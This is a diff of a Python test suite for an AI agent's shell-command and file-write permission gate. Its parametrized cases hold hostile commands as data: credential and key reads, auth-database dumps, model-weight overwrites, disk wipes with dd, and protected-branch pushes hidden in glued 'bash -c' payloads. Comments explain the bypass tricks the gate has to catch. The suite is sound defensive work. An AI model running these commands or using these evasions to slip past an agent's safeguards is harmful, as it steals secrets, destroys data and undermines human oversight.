+        assert is_sensitive_write_path(f"~/{prefix}/cron-running/a1b2c3d4.json") is True
+        assert (
+            is_sensitive_write_path(f"~/{prefix}/cron-running/{cron_inflight.BREAKER_CLAIM_FILE}")
+            is True
+        )
 
     def test_sibling_cron_names_are_not_over_blocked(self) -> None:
         from kiro_crew.security import is_sensitive_path, is_sensitive_write_path
@@ -9025,70 +6481,6 @@ class TestModelWeightsAreWriteProtected:
         assert security.is_sensitive_path(path) is False, path
 
     @pytest.mark.parametrize(
-        "template",
-        (
-            'cp /tmp/evil.bin "{p}"',
-            'echo forged > "{p}"',
-            'dd if=/tmp/evil.bin of="{p}"',
-            'install -m 0644 /tmp/evil.bin "{p}"',
-            'tee "{p}" < /tmp/evil.bin',
-        ),
-    )
-    def test_the_bash_gate_refuses_every_write_form(self, template: str) -> None:
-        """Matched verb-INDEPENDENTLY, so a novel write verb cannot walk around it."""
-        for path in self.MODEL_PATHS:
-            command = template.format(p=path)
-            assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "cd ~/.kiro/crew/models/whisper && cp /tmp/evil.bin ggml-base.bin",
-            "cd ~/.kirocrew/models ; echo x > a.gguf",
-            "cd ~/.kirocrew/models/ ; echo x > a.gguf",
-            "cd ~/.kirocrew/models/whisper; echo x > a.gguf",
-        ),
-    )
-    def test_naming_the_directory_is_refused_whatever_follows_it(self, command: str) -> None:
-        """The pattern is verb-independent, so the `cd` TARGET is itself the match."""
-        assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # The reported bypass: a `cd` into the fenced directory, then a RELATIVE
-            # write naming only the weight file. No home, no crew prefix, no separator.
-            "cd ~/.kiro/crew/models; cp /tmp/evil.bin ggml-base.bin",
-            "cd ~/.kiro/crew/models && cp /tmp/evil.bin ggml-base.bin",
-            "cd ~/.kiro/crew && echo x > models/ggml-base.bin",
-            "cd ~/.kiro && cp /tmp/evil.bin crew/models/ggml-base.bin",
-            "cd ~/.kiro/crew/models; dd if=/tmp/evil of=ggml-large-v3-turbo.bin",
-            "cd ~/.kiro/crew/models; mv /tmp/evil ggml-tiny.bin",
-            "cd ~/.kiro/crew/models; ln -sf /tmp/evil ggml-base.bin",
-            "cd ~/.kiro/crew/models; python -c \"open('ggml-small.bin','wb')\"",
-            # A suffixed spelling and the case-folded one, since over-matching is the
-            # safe direction for a gate that blocks on naming alone.
-            "cd ~/.kiro/crew/models; cp /tmp/evil.bin ggml-base.bin.tmp",
-            "cd ~/.kiro/crew/models; cp /tmp/evil.bin GGML-BASE.BIN",
-            # The archive form, where the weight name is INSIDE the tarball and so is
-            # unavailable to a name match. Caught by the `cd` target instead, which is
-            # why the terminator class has to accept a flush `;`.
-            "cd ~/.kiro/crew/models; tar -xf /tmp/evil.tar",
-            "cd ~/.kiro/crew/models; unzip /tmp/evil.zip",
-        ),
-    )
-    def test_a_cd_relative_write_cannot_reach_the_weights(self, command: str) -> None:
-        """Anchoring is not part of this contract, because the FILENAME is the grant.
-
-        The store hashes a file and then hands its path to a native loader that re-opens
-        it by name, so what a C++ GGML parser consumes is whatever sits at
-        ``ggml-<model>.bin`` at open time. An anchored pattern falls to one ``cd``, and
-        the anchored entry was all this had: every command here was ALLOWED before
-        ``_WHISPER_WEIGHT_NAME`` joined the anchor-independent pass.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
         "command",
         (
             # A name that merely ENDS with a weight name stays allowed, the same
@@ -9109,38 +6501,6 @@ class TestModelWeightsAreWriteProtected:
         """The cost of the two widenings, pinned. Both are deny-list widenings, so the
         only way they can be wrong is by refusing something ordinary."""
         assert security.is_sensitive_bash_command(command) is None, command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # Flush punctuation used to defeat the anchored pattern outright, for every
-            # fenced path rather than just this one: `&&` was blocked only because it is
-            # preceded by a space.
-            "cd ~/.aws;",
-            "cd ~/.ssh;",
-            "cd ~/.kiro/crew/profiles;",
-            "cd ~/.kiro/crew/models;",
-            "(cd ~/.aws)",
-            "cd ~/.kiro/crew/models|x",
-        ),
-    )
-    def test_flush_punctuation_no_longer_defeats_the_anchored_pattern(self, command: str) -> None:
-        """A shared boundary, so closing it for the weights closed it everywhere.
-
-        This tier's terminator set accepted only ``/``, whitespace, end-of-string and a
-        quote, which made a semicolon flush against a fenced directory a bypass for the
-        credential and keystone paths too. Kept here rather than moved because the
-        weights are what made it reachable: for a credential the following read is
-        caught by its own leaf name, while a weight file can arrive inside an archive
-        that names nothing.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_both_gates_carry_the_entry(self) -> None:
-        """Protected on one path only is not protected: the file-edit and shell gates
-        have to agree, which is the pairing rule the neighbouring entries document."""
-        assert any(p.endswith("/models") for p in security.write_protected_home_paths())
-        assert "models" in security._WRITE_PROTECTED_BASH_LEAVES
 
     def test_an_unrelated_path_named_models_is_not_fenced(self) -> None:
         """Scoped to the crew home, so an ordinary project directory is unaffected."""
@@ -9174,6 +6534,23 @@ class TestPublishFloorNestedPayloads:
         from kiro_crew.security import is_denied
 
         for cmd in self.WRAPPED_PROTECTED:
+            assert is_denied(cmd) is not None, cmd
+
+    def test_glued_command_flag_spelling_denied(self) -> None:
+        """``-c'<push>'`` (no space) is one token; the payload must still surface.
+
+        The bare-flag pattern rejects a token carrying the payload's own
+        characters, so the glued spelling was never yielded and the publish
+        floor -- whose ONLY enforcement is this walk -- never judged it (#8197).
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "bash -c'git push origin main'",
+            'sh -c"git push origin main"',
+            "bash -lc'git push --force origin main'",
+            "bash -ec'git push origin mainline'",
+        ):
             assert is_denied(cmd) is not None, cmd
 
     def test_end_of_options_terminator_does_not_hide_the_payload(self) -> None:
@@ -9532,6 +6909,243 @@ class TestPublishFloorNestedPayloads:
         assert len(_shell_payload_sources(cmd)) == len(_self_token_frames(cmd))
         assert cmd in _shell_payload_sources(cmd)
         assert "git push origin main" in _shell_payload_sources(cmd)
+
+
+class TestGluedShellCommandPayloadExtraction:
+    """A payload GLUED to a ``-c`` short-option cluster is extracted (#8197).
+
+    ``sh -c'rg . /fenced/root'`` reaches the walk as ONE token
+    (``-crg . /fenced/root``) once shlex strips the quotes.
+    ``_SHELL_COMMAND_FLAG_RE`` anchors the whole token as a bare flag cluster, so
+    a token carrying the payload's own characters was rejected -- and a payload
+    the extractor does not return is a command NONE of its consumers look
+    inside, the self-protection floor included.  The companion pattern
+    ``_SHELL_COMMAND_GLUED_RE`` captures the glued remainder instead of
+    weakening the flag pattern where it is used for pure flag detection.
+    """
+
+    def test_every_glued_spelling_yields_the_spaced_payload(self) -> None:
+        """Glued single-quoted, double-quoted, and clustered spellings agree."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        spaced = _nested_shell_payloads(_shell_tokens("sh -c 'rg . /fenced/root'"))
+        assert spaced == ["rg . /fenced/root"], spaced
+        for cmd in (
+            "sh -c'rg . /fenced/root'",  # glued single-quoted
+            'sh -c"rg . /fenced/root"',  # glued double-quoted
+            "sh -ec'rg . /fenced/root'",  # letters BEFORE the c in the cluster
+            "sh -xc'rg . /fenced/root'",
+        ):
+            payloads = _nested_shell_payloads(_shell_tokens(cmd))
+            assert payloads == spaced, (cmd, payloads)
+
+    def test_glued_unquoted_payload_is_extracted(self) -> None:
+        """No quotes at all: ``-cwhoami`` runs ``whoami`` in a real shell."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cwhoami"))
+        assert "whoami" in payloads, payloads
+
+    def test_bare_cluster_is_not_read_as_glued(self) -> None:
+        """Negative: ``-lc`` and ``-c`` carry no payload of their own.
+
+        The script is the NEXT token, exactly as before -- the glued reading must
+        not invent a second payload out of a bare flag cluster.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -lc 'git status'"))
+        assert payloads == ["git status"], payloads
+        assert _nested_shell_payloads(_shell_tokens("bash -c")) == []
+
+    def test_all_alpha_cluster_yields_both_readings(self) -> None:
+        """``-ecfoo`` is ambiguous post-tokenization, so BOTH readings surface.
+
+        It matches the bare-flag pattern (the next token is the script, the
+        reading this extractor always had) AND a real shell ends option parsing
+        at the ``c`` and runs ``foo``.  Picking one interpretation would make the
+        other a bypass; extraction over-approximates instead, which this module
+        documents as the safe direction.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -ecfoo bar"))
+        assert "foo" in payloads, payloads
+        assert "bar" in payloads, payloads
+
+    def test_a_glued_decoy_does_not_eat_a_later_spaced_payload(self) -> None:
+        """The two spellings are scanned independently, so both yield.
+
+        Folding the glued spelling into the shared stop table would let a glued
+        decoy consume the stop through which a later spaced ``-c``'s payload was
+        found, turning the fix itself into a bypass.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cx.sh -c 'rg . /fenced/root'"))
+        assert "x.sh" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_a_herestring_does_not_eat_a_later_command_flag_payload(self) -> None:
+        """The herestring stop is independent of the ``-c`` stop for the same
+        reason: sharing one table let ``bash <<<'x' -c '<script>'`` yield only
+        ``x`` while a real shell runs the script."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash <<<'x' -c 'rg . /fenced/root'"))
+        assert "x" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_uppercase_cluster_letters_still_carry_the_payload(self) -> None:
+        """``-C`` (noclobber) clusters like any other flag, and the alt pass
+        feeds case-PRESERVING tokens -- a lowercase-only class dropped these."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        for cmd in (
+            "bash -Cc'rg . /fenced/root'",
+            "bash -Cc 'rg . /fenced/root'",
+        ):
+            payloads = _nested_shell_payloads(_shell_tokens(cmd))
+            assert "rg . /fenced/root" in payloads, (cmd, payloads)
+
+    def test_case_folded_cluster_splits_are_all_examined(self) -> None:
+        """Which ``c`` took the argument is unrecoverable after the case fold.
+
+        The deny tiers lowercase input before the walk, so ``-Cc'<script>'``
+        (``-C`` noclobber + ``-c`` script, a real zsh/ksh spelling) folds to
+        ``-cc<script>`` and the first-``c`` split reads the payload as
+        ``c<script>`` -- one junk letter hid a protected push from the publish
+        floor, and the attacker can also write the folded spelling directly
+        (found by the GPT 5.6 CI lane).  Every plausible split is yielded
+        instead: the run's last ``c`` (all flags) and second-to-last (a payload
+        whose program starts with one ``c``, like ``cat``).
+        """
+        from kiro_crew.security import (
+            _nested_shell_payloads,
+            _shell_c_carrier_payloads,
+            _shell_tokens,
+            is_denied,
+        )
+
+        for cmd in (
+            "zsh -Cc'git push origin main'",
+            "bash -Cc'git push origin main'",
+            "zsh -cc'git push origin main'",  # folded spelling written directly
+            "bash -Cc'git push --force origin main'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+        # The correct boundary is among the yielded candidates.
+        payloads = _nested_shell_payloads(_shell_tokens("zsh -cc'git push origin main'"))
+        assert "git push origin main" in payloads, payloads
+        # A payload whose program name itself starts with ``c``.
+        assert "cat /fenced/file" in _shell_c_carrier_payloads("-cccat /fenced/file")
+        # A ``c`` past the first non-letter belongs to the payload's own text:
+        # splitting there would shred the payload, so it is not a candidate.
+        assert _shell_c_carrier_payloads("-crg . /fenced/root") == ["rg . /fenced/root"]
+        # Split positions are bounded to the window: an alternating-``c``
+        # cluster of any length yields a bounded candidate set instead of a
+        # quadratic one (a ~3 KB such token outlived the loop watchdog), and
+        # the bound is not a padding bypass -- the true split sits within a
+        # first-word length of the region's end, and padding only adds fake
+        # splits farther out.
+        flooded = _shell_c_carrier_payloads("-" + "ac" * 1600 + "c'git push origin main'")
+        assert len(flooded) <= 70, len(flooded)
+        # Feature-branch pushes and benign scripts stay allowed.
+        assert is_denied("bash -Cc'git push origin my-feature'") is None
+        assert is_denied("bash -cc'ls -la'") is None
+
+    def test_an_uppercase_cluster_does_not_eat_the_command_flag_stop(self) -> None:
+        """The flag pattern stays lowercase-only ON PURPOSE.
+
+        Widening it to ``[A-Za-z]`` made ``-Cc`` the first flag stop, which ate
+        the stop through which a following ``--command``'s payload was found --
+        the one old-stop class neither the glued table nor the sweep reaches.
+        Uppercase clusters are covered by the sweep and the glued pattern
+        instead, so BOTH payloads surface for the CASE-PRESERVING callers (the
+        alt-traversal pass, pinned here by calling the extractor directly).
+        The deny tiers lowercase first, where ``-Cc`` folds to ``-cc`` and the
+        ``--command`` residual remains -- pre-existing there, and out of this
+        pattern's reach.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -Cc --command 'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_every_carrier_is_swept_not_only_the_first_stop(self) -> None:
+        """Each stop table reads ONE token per shell, so a decoy that satisfies
+        the same predicate eats the stop through which a later carrier's payload
+        was found.  The every-carrier sweep restores what the alt pass's deleted
+        local extractor yielded: a payload for EVERY ``-c`` carrier, under the
+        loose recognition (any prefix before the first lowercase ``c``).
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        # A glued decoy before a glued carrier (both satisfy the glued predicate).
+        payloads = _nested_shell_payloads(_shell_tokens("ksh -onoclobber -c'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+        # A flag decoy before a spaced carrier (both satisfy the flag predicate).
+        payloads = _nested_shell_payloads(
+            _shell_tokens("bash -Cc benign -c 'git push origin main'")
+        )
+        assert "git push origin main" in payloads, payloads
+        # Two spaced carriers: the second used to collapse into the first.
+        payloads = _nested_shell_payloads(_shell_tokens("bash -c 'true' -c 'rg . /fenced/root'"))
+        assert "true" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+        # A glued decoy before a glued carrier of the publish floor's payload.
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cx.sh -c'git push origin main'"))
+        assert "git push origin main" in payloads, payloads
+
+    def test_non_alpha_cluster_prefixes_still_carry_the_payload(self) -> None:
+        """The deleted local extractor tolerated ANY prefix before the first
+        lowercase ``c`` (``-1c``); the loose sweep preserves that recognition."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -1c 'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+        payloads = _nested_shell_payloads(_shell_tokens("bash -1c'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_many_shells_sharing_one_long_glued_payload_stay_linear(self) -> None:
+        """N shell tokens all stop at ONE glued token carrying a length-N payload.
+
+        Extracting at the stop index per shell token copies the same length-N
+        substring N times -- O(N^2) time and memory for an O(N)-sized input,
+        inside the synchronous permission gate (found by the GPT 5.6 review
+        lane).  The payload is extracted once per TOKEN up front and later
+        appends reuse the cached string, so the walk stays linear.  Measured
+        across an 8x size gap with a 20x bound, the same methodology the
+        eval-join linearity test above documents.
+        """
+        import time
+
+        from kiro_crew.security import _nested_shell_payloads
+
+        def elapsed(n: int) -> float:
+            tokens = ["bash"] * n + ["-c" + "x" * n]
+            start = time.perf_counter()
+            _nested_shell_payloads(tokens)
+            return time.perf_counter() - start
+
+        def best(n: int, samples: int = 3) -> float:
+            return min(elapsed(n) for _ in range(samples))
+
+        elapsed(500)
+        small, large = best(2000), best(16000)
+        assert large < small * 20, f"{small:.4f}s -> {large:.4f}s looks super-linear"
+        # No absolute cap, matching the eval-join test above: under the backend
+        # jobs' coverage tracing wall time prices line events, not algorithmic
+        # cost (#8641); the same-run ratio is the regression guard.
+
+    def test_glued_payload_reaches_the_regex_tier_views(self) -> None:
+        """Consumer: the deny-view pass judges the glued payload's own text."""
+        from kiro_crew.security import is_denied
+
+        spaced = "bash -c 'dd \"if=/dev/zero\" of=/dev/sda'"
+        glued = "bash -c'dd \"if=/dev/zero\" of=/dev/sda'"
+        assert is_denied(spaced) is not None
+        assert is_denied(glued) is not None
 
 
 class TestImdsMixedBaseEncodings:
@@ -9951,85 +7565,6 @@ class TestGitPublishSubshellGluing:
             assert _is_push_to_protected_branch(cmd.lower()) is False, cmd
 
 
-class TestMaskedSubstitutionKeepsAdjacentLiterals:
-    """A masked substitution must not swallow the literal text after it.
-
-    The placeholder was a BARE ``$__kc_subst``, so bash-identifier characters
-    following the substitution were absorbed into the placeholder's own name and
-    silently deleted from the path -- the unresolved reading of
-    ``~/.a$(echo '')ws/credentials`` became the benign ``~/.a/credentials``.
-    Masking is a defence, so a form where it DESTROYS the signal is strictly
-    worse than not masking; the brace form keeps the literal separate, which is
-    why the ``${UNSET}`` equivalent was already denied.
-    """
-
-    def test_substitution_glued_to_literal_is_denied(self) -> None:
-        for cmd in (
-            "cat ~/.a$(echo '')ws/credentials",
-            "cat ~/.k$(echo '')iro/crew/token_signing.key",
-            "cat ~/.a`echo`ws/credentials",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_matches_the_unset_variable_equivalent(self) -> None:
-        # The brace-delimited unset-variable form was already denied; the masked
-        # substitution is unresolvable for the same reason, so it must agree.
-        assert is_sensitive_bash_command("cat ~/.a${UNSETX}ws/credentials") is not None
-        assert is_sensitive_bash_command("cat ~/.a$(echo '')ws/credentials") is not None
-
-    def test_unvalued_placeholder_is_brace_delimited(self) -> None:
-        from kiro_crew.security import _SUBST_PLACEHOLDER_NAME, _mask_substitutions
-
-        # The NAME must stay brace-free so the reserved-name refusal still matches.
-        assert "{" not in _SUBST_PLACEHOLDER_NAME
-        assert "}" not in _SUBST_PLACEHOLDER_NAME
-        masked = _mask_substitutions("cat ~/.a$(echo '')ws/credentials")
-        assert "${" in masked and "}ws" in masked, masked
-
-    def test_valued_placeholder_stays_bare(self) -> None:
-        """The asymmetry is deliberate: the two passes fail closed differently.
-
-        The valued pass records a GUESSED value, so a resolvable reference
-        substitutes that guess. Bare, a trailing literal is absorbed into the
-        name, which is then absent from ``values`` and reads as unresolved --
-        the absorption is what makes this pass fail closed. Bracing it let the
-        guess resolve and lost that reading.
-        """
-        from kiro_crew.security import _mask_substitutions_valued
-
-        numbered, values = _mask_substitutions_valued("cat $(pwd)x $(pwd)y")
-        assert "$__kc_subst1x" in numbered, numbered
-        assert "$__kc_subst2y" in numbered, numbered
-        # The absorbed spellings are NOT recorded, which is the fail-closed part.
-        assert "__kc_subst1x" not in values, values
-        assert "__kc_subst2y" not in values, values
-
-    def test_a_wrong_path_guess_cannot_resolve_away_the_unresolved_reading(self) -> None:
-        """Regression: bracing the valued placeholder allowed a credential read.
-
-        ``_substitution_path_guess`` vouches for the LAST path-like word, which
-        here is the redirection ``</dev/null`` rather than a path at all. With
-        the valued placeholder braced, that guess resolved and the following
-        credential read went from denied to allowed. Reported separately: making
-        the guess genuinely additive is the deeper fix.
-        """
-        for cmd in (
-            "cd $(printf /home/ </dev/null)alice; cat .aws/credentials",
-            "cd $(printf /home/ 2>/dev/null)alice; cat .aws/credentials",
-            "cd $(printf /home/)alice; cat .aws/credentials",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_benign_globs_and_paths_not_overblocked(self) -> None:
-        for cmd in (
-            "cat ~/notes/*.md",
-            "ls ~/*.txt",
-            "cat ~/.config/app/settings.json",
-            "echo $(date)x",
-        ):
-            assert is_sensitive_bash_command(cmd) is None, cmd
-
-
 class TestIdentityAuthStoreFence:
     """The identity/auth SQLite store is a keystone leaf under the crew data home.
 
@@ -10075,30 +7610,6 @@ class TestIdentityAuthStoreFence:
             # the file-edit tool path is pinned too.
             assert is_sensitive_write_path(f"~/{prefix}/{leaf}") is True, leaf
 
-    @pytest.mark.parametrize("prefix", PREFIXES)
-    def test_every_shell_read_form_is_refused(self, prefix: str) -> None:
-        """The four routes to the same bytes: direct read, client, copy, traversal."""
-        for cmd in (
-            f"cat ~/{prefix}/data.sqlite3",
-            f"sqlite3 ~/{prefix}/data.sqlite3 .dump",
-            f"sqlite3 ~/{prefix}/data.sqlite3 'select * from auth_kv'",
-            f"cp ~/{prefix}/data.sqlite3 /tmp/x",
-            f"find ~/{prefix}/data.sqlite3 -type f",
-            f"grep -a token ~/{prefix}/data.sqlite3",
-            f"tar -cf /tmp/x.tar ~/{prefix}/data.sqlite3",
-            f"cat ~/{prefix}/data.sqlite3-wal",
-            f"cp ~/{prefix}/data.sqlite3-journal /tmp/x",
-            # The verb-independent backstop: a scripted open of the same path.
-            f"python3 -c \"print(open('~/{prefix}/data.sqlite3','rb').read())\"",
-            # Writes too -- forged identity rows are the other half of the risk.
-            f"echo x > ~/{prefix}/data.sqlite3",
-        ):
-            assert is_sensitive_bash_command(cmd) is not None, cmd
-
-    def test_absolute_home_spelling_is_refused(self) -> None:
-        home = os.path.expanduser("~")
-        assert is_sensitive_bash_command(f"cat {home}/.kiro/crew/data.sqlite3") is not None
-
     def test_unrelated_databases_are_not_over_blocked(self) -> None:
         """The cost of a basename rule, which this fence deliberately does not pay."""
         from kiro_crew.security import is_sensitive_write_path
@@ -10115,1922 +7626,199 @@ class TestIdentityAuthStoreFence:
         ):
             assert is_sensitive_bash_command(cmd) is None, cmd
 
-    def test_name_only_traversal_is_the_same_class_as_every_other_leaf(self) -> None:
-        """A ``-name`` traversal from an UNFENCED ancestor is a different pass.
 
-        ``find ~ -name <leaf>`` names no path the gate can match -- the directory and
-        the filename arrive as separate arguments -- and that is true of every keystone
-        leaf, not of this one. Asserting the two verdicts AGREE pins the fence's shape
-        without pinning the traversal pass's own verdict, so the work that re-joins a
-        factored-apart path is free to change it for both at once.
-        """
-        store = is_sensitive_bash_command("find ~ -name data.sqlite3 -exec cat {} +")
-        control = is_sensitive_bash_command("find ~ -name token_signing.key -exec cat {} +")
-        assert (store is None) == (control is None)
+class TestTraversalSimulationIsGone:
+    """The gate does not simulate the shell.
 
-
-class TestFindTraversalReachesFence:
-    """``find`` factors a path into a root and a name pattern, so neither token names it.
-
-    Every other pass in this module answers "does a TOKEN resolve to a fenced
-    path". ``find ~/.kiro/crew -name .env -exec cat {} +`` has no such token: the
-    directory is in one argument, the leaf in another, and the path itself is
-    produced at runtime. Re-joining the two is what makes the traversal visible
-    (#7034).
-
-    The delivery requirement is what keeps this narrow: a bare ``find`` that only
-    LISTS is unaffected, so the newly-denied set is exactly the traversals that
-    hand a match to a command.
+    Working out where ``find``, ``grep -r``, a brace expansion or a ``cd`` chain
+    would land needs shell and find-utils grammar re-implemented in regex, and
+    the passes that did it refused ordinary read-only commands far more often
+    than they caught an access worth refusing. What replaces them is not a weaker
+    version of the same idea: the keystone paths are refused by
+    :func:`is_sensitive_path` on every resolved path a caller opens, and by the
+    OS sandbox for the agent process as a whole, neither of which can be talked
+    around by respelling a command. :class:`TestTheBashGateMatchesNoPaths` pins
+    the refusals the gate still owes.
     """
 
-    # ── the forms measured on the issue ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find ~/.kiro/crew -name 'token_signing.key' -exec cat {} +",
-            "find ~/.kiro/crew -name 'computer_use.json' -exec cat {} +",
-            "find ~/.kiro/crew -name '*.lock' | xargs cat",
-        ),
+    #: Read-only traversals an agent runs constantly. Every one of these was
+    #: denied by the removed passes -- the relative root resolved against the
+    #: gateway's own working directory, which on the desktop app is ``/`` and
+    #: therefore holds every fenced store.
+    ALLOWED = (
+        "grep -rn pattern .",
+        "grep -r TODO src/",
+        'find . -name "*.py"',
+        "find . -type f -newer setup.py",
+        "ls -R .",
+        "du -sh *",
+        "rg --files .",
+        "cd /tmp && grep -r foo .",
+        "tar -czf out.tgz .",
+        "find src -name '*.py' -exec wc -l {} +",
     )
-    def test_issue_bypasses(self, command: str) -> None:
-        """Four of the five commands reported on #7034 -- each reads a permanent
-        secret. The fifth reaches ``~/.aws/credentials`` and so needs a store on
-        disk; it is covered in the fake home below."""
-        assert security.is_sensitive_bash_command(command), command
 
-    def test_the_fifth_issue_bypass(self, monkeypatch, tmp_path) -> None:
-        """``find ~ -name credentials -exec cat {} +`` -- the traversal starts
-        OUTSIDE the fence and reaches ``.aws`` by descent, which is why the root
-        names nothing the earlier passes could see."""
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(
-            f"find {home} -name 'credentials' -exec cat {{}} +"
-        )
-        security._home_targets_cache.clear()
+    @pytest.mark.parametrize("command", ALLOWED)
+    def test_read_only_traversals_are_not_refused(self, command: str) -> None:
+        assert is_sensitive_bash_command(command) is None, command
 
-    # ── the carrier grammar: every way find hands a match to a command ──
+    def test_the_simulation_helpers_are_absent(self) -> None:
+        """Names, not behaviour, so re-adding the machinery fails loudly here.
 
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find ~/.kiro/crew -name '.env' -exec cat {} ;",
-            "find ~/.kiro/crew -name '.env' -execdir cat {} +",
-            "find ~/.kiro/crew -name '.env' -ok cat {} ;",
-            "find ~/.kiro/crew -name '.env' -okdir cat {} ;",
-            "find ~/.kiro/crew -name '.env' -delete",
-            "find ~/.kiro/crew -name '.env' -fprint /tmp/leak",
-            "find ~/.kiro/crew -name '.env' -fls /tmp/leak",
-            "find ~/.kiro/crew -name '.env' -fprintf /tmp/leak '%p'",
-            "find ~/.kiro/crew -name '.env' -exec sh -c 'cat \"$1\"' _ {} ;",
-            # the pipe is the delivery, so xargs' own flag grammar never matters
-            "find ~/.kiro/crew -name '.env' | xargs cat",
-            "find ~/.kiro/crew -name '.env' -print0 | xargs -0 cat",
-            "find ~/.kiro/crew -name '.env' | xargs -I{} cat {}",
-            "find ~/.kiro/crew -name '.env' | xargs -n1 -P4 head -c 100",
-            "find ~/.kiro/crew -name '.env' | while read f; do cat $f; done",
-            "cat $(find ~/.kiro/crew -name '.env')",
-            "cat `find ~/.kiro/crew -name '.env'`",
-            "cat < <(find ~/.kiro/crew -name '.env')",
-            "find ~/.kiro/crew -name '.env' > /tmp/leak",
-        ),
-    )
-    def test_every_delivery_form_is_denied(self, command: str) -> None:
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_an_unknown_primary_is_treated_as_delivery(self) -> None:
-        """Fail closed: the inert set is the allow-list, so a primary nobody
-        enumerated denies rather than permits. That polarity is the module's own
-        (`_TRUST_ROOT_READ_LISTERS`): naming the writers fails OPEN."""
-        assert security.is_sensitive_bash_command(
-            "find ~/.kiro/crew -name '.env' -exceedingly-new-primary cat {} +"
-        )
-
-    # ── the three ways a traversal can name a fenced path ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # the root IS the directory whose secrets live in its leaves, and the
-            # leaf is the runtime wildcard -- the `~/.kiro/crew/$F` shape
-            "find ~/.kiro/crew -type f -exec cat {} +",
-            "find ~/.kiro/crew -name '*' -exec cat {} +",
-            "find ~/.kiro/crew -name 'tmp*.tmp' -exec cat {} +",
-            "find ~/.kirocrew -name '.env' -exec cat {} +",
-            "find ~/.kiro/crew/workspace/md-notebook -type f -exec cat {} +",
-            # the root IS a fenced directory
-            "find ~/.aws -type f -exec cat {} +",
-            "find ~/.ssh -type f -exec cat {} +",
-        ),
-    )
-    def test_root_names_the_credential_directory(self, command: str) -> None:
-        assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # the pattern matches a name the fence itself declares
-            "find ~ -name '.env' -exec cat {} +",
-            "find ~ -name 'token_signing.key' -exec cat {} +",
-            "find ~ -name 'security_policy.json' -exec cat {} +",
-            "find ~ -name '.local_secret' -exec cat {} +",
-            "find ~ -name '*.key' -exec cat {} +",
-            "find ~ -name '.npmrc' -exec cat {} +",
-            # -iname folds, and so does the fence
-            "find ~ -iname '.ENV' -exec cat {} +",
-            "find ~ -iname 'TOKEN_SIGNING.KEY' -exec cat {} +",
-        ),
-    )
-    def test_pattern_names_a_declared_fence_name(self, command: str) -> None:
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_traversal_from_the_filesystem_ROOT_reaches_a_declared_name(self) -> None:
-        """The absolute-root spelling, computed rather than written as ``/``.
-
-        ``find /`` is a POSIX-only literal: on Windows the fence lives under a drive and
-        no target starts with ``/``. The root must come from the anchor of the home the
-        fence is ACTUALLY anchored on, not from the current working directory's drive --
-        the Windows shard runs from ``D:`` while the home is on ``C:``, so a traversal of
-        the CWD's drive reaches no fence and the assertion could never hold. Interpolated
-        with forward slashes because a backslash is an escape to shlex.
+        A behavioural assertion cannot tell "the simulation is gone" from "the
+        simulation is present and happens to allow this input", which is how a
+        reinstated pass would slip back in under the tests above.
         """
-        root = Path(Path(os.path.expanduser("~")).anchor).as_posix()
-        command = f"find {root} -name 'token_signing.key' -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
+        from kiro_crew import security
+
+        for name in (
+            "_check_find_traversal_reaches_fence",
+            "_check_alt_traversal_reaches_fence",
+            "_check_sensitive_via_normalizer",
+            "_check_sensitive_cd_taint",
+            "_find_traversal_reaches_fence",
+            "_alt_root_reaching_fence",
+            "_path_candidates",
+        ):
+            assert not hasattr(security, name), name
+
+    def test_the_gate_takes_no_traversal_subject_parameter(self) -> None:
+        """The parameter existed only to re-point the removed structure passes."""
+        import inspect
+
+        params = inspect.signature(is_sensitive_bash_command).parameters
+        assert "_traversal_subjects" not in params
+
+
+class TestARefusalNamesItsRuleAndSpan:
+    """A refusal has to be diagnosable by the agent that receives it.
+
